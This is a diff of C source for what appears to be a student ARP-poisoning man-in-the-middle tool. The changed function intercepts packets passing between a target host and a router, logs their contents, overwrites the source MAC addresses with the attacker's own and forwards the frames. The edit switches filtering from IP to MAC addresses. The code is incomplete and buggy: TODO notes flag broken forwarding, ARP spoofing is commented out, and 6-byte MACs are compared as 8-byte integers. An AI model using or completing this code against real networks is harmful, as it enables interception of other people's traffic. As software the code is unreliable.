@@ -11,10 +11,8 @@
 # include <linux/if_packet.h>
 # include <errno.h>
 
-///BUG: Cannot intercept comunication for some reason
-///HINTS: Can poison both targets but i've receive nothing from a ping between targets
-///HINTS: After the ping the arp table is reset (containing good values)
-///MAYBE: My computer receives the ping, aswers with a pong and ARP is updated.
+///TODO: Intecept packets but do not propagate them well arfer reading
+///FUNCTION: forward packets
 
 ///TODO: Recv arp replies (i ve commented this for the moment)
 
@@ -134,10 +132,13 @@ err_t man_in_the_middle(const char *av[], const proginfo_t *const info, volatile
 
     PRINT_INFO("Intercepting and loggin target's (`%s\' <-> `%s\') comunication, press ctrl^C to end.\n", info->target.ip, info->router.ip);
 
+    uint8_t router_mac[SIZEOFMAC];
+    ft_memcpy(router_mac, getmacfromstr(info->router.mac), SIZEOFMAC);
+    uint8_t target_mac[SIZEOFMAC];
+    ft_memcpy(target_mac, getmacfromstr(info->target.mac), SIZEOFMAC);
+
     for ( ; ; )
     {
-        printf("[DEBUG] Waiting for incoming packets\n");
-
         if ((recvbytes = recvfrom(info->sockip, buff, sizeof(buff) / sizeof(*buff), 0, (struct sockaddr*)&sll, (socklen_t[]){sizeof(sll)})) < 0)
         {
             PRINT_ERROR(MSG_ERROR_SYSCALL, "recvfrom");
@@ -145,20 +146,15 @@ err_t man_in_the_middle(const char *av[], const proginfo_t *const info, volatile
             goto error;
         }
 
-        printf("[DEBUG] Packet intercepted\n");
-
-        /* Supports only IPv4 for the moment */
-        if (SADDRVALUETO_SADDRIN(sll).sin_family != AF_INET)
-            continue;
-
         ///TODO: Last thing to do
         /* Intercept and spoof any attempt of ARP */
         // if ((st = look_for_arp_packets((proginfo_t*)info)) != SUCCESS)
         //     goto error;
 
         /* (filter) Log/forward only packet from target or router */
-        if (SADDRVALUETO_SADDRIN(sll).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->router.addr).sin_addr.s_addr)
+        if (*(uint64_t*)sll.sll_addr == *(uint64_t*)router_mac)
         {
+            printf("[DEBUG] Packet from router !\n");
             /* Log packet's matadada and payload */
             log_content(buff, recvbytes, isstdout);
             /* Overwritte the src's MAC address with mine */
@@ -167,17 +163,19 @@ err_t man_in_the_middle(const char *av[], const proginfo_t *const info, volatile
             /* Sent packet to its destination (in victim's point of view) */
 
             ///TODO: Bad destination type for forward packet
-            if ((st = forward_packet(info->sockip, buff, recvbytes, (const struct sockaddr *)&info->target.addr)) != SUCCESS)
+            if ((st = forward_packet(info->sockip, buff, recvbytes, &sll)) != SUCCESS)
                 goto error;
         }
-        else if (SADDRVALUETO_SADDRIN(sll).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->target.addr).sin_addr.s_addr)
+        else if (*(uint64_t*)sll.sll_addr == *(uint64_t*)target_mac)
         {
+            printf("[DEBUG] Packet from target !\n");
+
             log_content(buff, recvbytes, isstdout);
             ft_memcpy(sll.sll_addr, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
             ft_memcpy(eth->h_source, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
 
             ///TODO: Bad destination type for forward packet
-            if ((st = forward_packet(info->sockip, buff, recvbytes, (const struct sockaddr *)&info->router.addr)) != SUCCESS)
+            if ((st = forward_packet(info->sockip, buff, recvbytes, &sll)) != SUCCESS)
                 goto error;
         }
 
